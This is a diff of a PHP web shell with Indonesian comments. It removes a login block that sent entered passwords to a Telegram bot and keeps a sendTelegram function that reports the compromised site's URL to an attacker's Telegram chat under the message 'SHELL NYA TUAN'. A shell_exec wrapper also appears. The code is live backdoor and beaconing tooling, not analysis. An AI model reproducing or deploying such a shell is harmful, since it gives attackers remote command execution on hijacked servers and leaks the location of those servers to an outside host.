@@ -4,23 +4,14 @@ session_start();
 // TAMPILKAN ERROR
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
-// ============ LOGIN =============
-if (!isset($_SESSION['login'])) {
-    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hashed_password)) {
-        $_SESSION['login'] = true;
 
-        // ✅ Kirim Telegram
-        sendTelegram($_SERVER['HTTP_HOST'], trim(dirname($_SERVER['PHP_SELF']), '/'), basename(__FILE__), $_POST['pass']);
-
-        header("Location: ?");
-        exit;
-    }
-}
 // UTIL
 function sendTelegram($domain, $path, $file, $passwordInput) {
     global $botToken, $chatId;
     $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-    $msg = "SHELL NYA TUAN\nIP: $ip\nURL : https://$domain/$path/$file\nPASS: $passwordInput";
+    $link = "https://$domain/$path/$file";
+    $msg = "SHELL NYA TUAN
+URL : https://$domain/$path/$file";
 
     $data = [
         'chat_id' => $chatId,
@@ -31,30 +22,8 @@ function sendTelegram($domain, $path, $file, $passwordInput) {
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($ch);
-    $error = curl_error($ch);
+    curl_exec($ch);
     curl_close($ch);
-
-    // Log untuk debug (hapus jika tidak perlu)
-    file_put_contents('/tmp/telegram_log.txt', "RESP:\n$response\nERROR:\n$error");
-}
-if (function_exists('sendTelegram')) {
-    sendTelegram($_SERVER['HTTP_HOST'], trim(dirname($_SERVER['PHP_SELF']), '/'), basename(__FILE__), $_SESSION['password_input'] ?? 'unknown');
-}
-if (
-    isset($_POST['username'], $_POST['password']) &&
-    $_POST['username'] === $username &&
-    password_verify($_POST['password'], $passwordHash)
-) {
-    $_SESSION['loggedin'] = true;
-    // tindakan selanjutnya...
-}
-
-    // Kirim notifikasi Telegram
-    sendTelegram($_SERVER['HTTP_HOST'], trim(dirname($_SERVER['PHP_SELF']), '/'), basename(__FILE__), 'admin login');
-
-    header("Location: " . $_SERVER['PHP_SELF']);
-    exit();
 }
 function safe_exec($cmd) {
     // shell_exec
